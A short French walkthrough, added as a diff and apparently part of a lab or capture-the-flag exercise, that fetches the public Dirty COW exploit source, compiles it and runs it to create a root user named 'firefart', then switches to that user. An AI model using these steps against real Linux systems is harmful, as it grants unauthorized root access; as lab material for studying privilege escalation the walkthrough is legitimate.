@@ -1,0 +1,38 @@
+-------------- Etape 1 --------------
+		Creation de dirty.c :
+
+Dans la vm, faire:
+vim dirty.c
+
+Sur internet, aller a l'adresse suivante:
+https://github.com/FireFart/dirtycow/blob/master/dirty.c
+
+dans dirty.c ouvert avec vim, faire un copier coller du contenu de dirty.c d'internet.
+Sauvegarder et fermer le fichier.
+
+
+-------------- Etape 2 --------------
+			Compilation :
+
+Executer la commade suivante:
+gcc -pthread dirty.c -o dirty -lcrypt
+
+
+-------------- Etape 3 --------------
+  Creer un nouvel utilisateur root :
+
+Lancer dirty:
+./dirty my-new-password
+
+Par defaut, l'utilisateur "firefart" est cree avec les droits root
+et le mot de passe donne en parametre.
+Apres quelques instants, ctrl-c pour revenir au shell.
+
+-------------- Etape 4 --------------
+			Devenir root :
+
+su firefart (nom du nouvel utilisateur root)
+entrer le mot de passe.
+
+Taper "id" pour verifier vos droits.
+vous etes root.
